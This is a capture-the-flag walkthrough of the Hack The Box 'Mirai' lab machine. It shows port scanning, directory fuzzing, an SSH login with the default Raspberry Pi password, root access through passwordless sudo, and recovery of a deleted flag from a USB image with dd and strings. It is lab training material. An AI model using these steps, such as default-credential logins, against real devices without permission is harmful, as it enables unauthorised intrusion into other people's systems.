# Hack The Box: Mirai

| Field | Value |
| --- | --- |
| Machine | Mirai (Linux, Easy) |
| Date | 26 September 2026 |
| Target for this session | `10.129.74.128` |
| Initial access | SSH with the default Raspberry Pi credentials |
| Root access | Passwordless sudo for the `pi` user |
| Root flag | Recovery of a deleted file from the USB device image |

The target IP belonged to this lab session and will change after a reset.

## Reconnaissance

The first service scan identified SSH, DNS, and HTTP:

```bash
nmap -sV --open -oN mirai-initial.txt 10.129.74.128
```

```text
22/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u3
53/tcp open  domain  dnsmasq 2.76
80/tcp open  http    lighttpd 1.4.35
```

I checked the full TCP port range, then identified the additional services:

```bash
nmap -p- --min-rate 1000 -oN mirai-all-ports.txt 10.129.74.128
nmap -sV -p 22,53,80,1227,32400,32469 \
  -oN mirai-services.txt 10.129.74.128
```

| Port | Service |
| --- | --- |
| 22/tcp | SSH |
| 53/tcp | dnsmasq |
| 80/tcp | lighttpd |
| 1227/tcp | Platinum UPnP 1.0.5.13 |
| 32400/tcp | Plex Media Server |
| 32469/tcp | Platinum UPnP 1.0.5.13 |

## Web service

I enumerated the web paths to find the administration interface:

```bash
ffuf -u http://10.129.74.128/FUZZ \
  -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt \
  -fc 404 -t 30 -o mirai-ffuf.json
```

The `/admin/` path served a **Pi-hole v3.1.4** administration portal:

```text
http://10.129.74.128/admin/
```

Pi-hole, Plex, and the hostname clues suggested a Raspberry Pi installation. I checked whether the default `pi` account still used its original password.

## SSH access and user flag

```bash
ssh pi@10.129.74.128
```

The password `raspberry` granted access. On the target, the account belonged to the `sudo` group. I checked its privileges and read the user flag:

```bash
id
sudo -ll
cat /home/pi/Desktop/user.txt
```

The sudo rules included `(ALL) NOPASSWD: ALL`, allowing root access without a password:

```bash
sudo -n -i
id
cat /root/root.txt
```

The shell reported `uid=0(root)`. Rather than containing the flag, `/root/root.txt` said the original file might have been backed up on a USB stick.

## USB inspection

From the root shell, I identified the USB filesystem and inspected its files:

```bash
df -h
lsblk -f
ls -lah /media/usbstick
find /media/usbstick -maxdepth 2 -type f -print
cat /media/usbstick/damnit.txt
ls -lah /media/usbstick/lost+found
```

`lsblk` showed an ext4 filesystem on `/dev/sdb`, mounted at `/media/usbstick`. The only regular file was `damnit.txt`, which explained that the files on the USB stick had been accidentally deleted. `lost+found` contained no recovered files.

| Device | Filesystem | Mount point |
| --- | --- | --- |
| `/dev/sdb` | ext4 | `/media/usbstick` |

The mount displayed the current directory entries. To look for the deleted file's contents, I read the whole block device into an image on the system's temporary filesystem. This kept the image off the USB stick:

```bash
dd if=/dev/sdb of=/tmp/mirai-usb.img bs=1M
```

The command copied 10,485,760 bytes. I searched the image for readable text, including 32-character hexadecimal strings matching the format of an HTB flag:

```bash
strings -a /tmp/mirai-usb.img | grep -Ei '[0-9a-f]{32}|root\.txt'
```

The output contained references to `root.txt` and the deleted root flag. The file was gone from the mounted directory, but its contents were still readable in the USB device image.

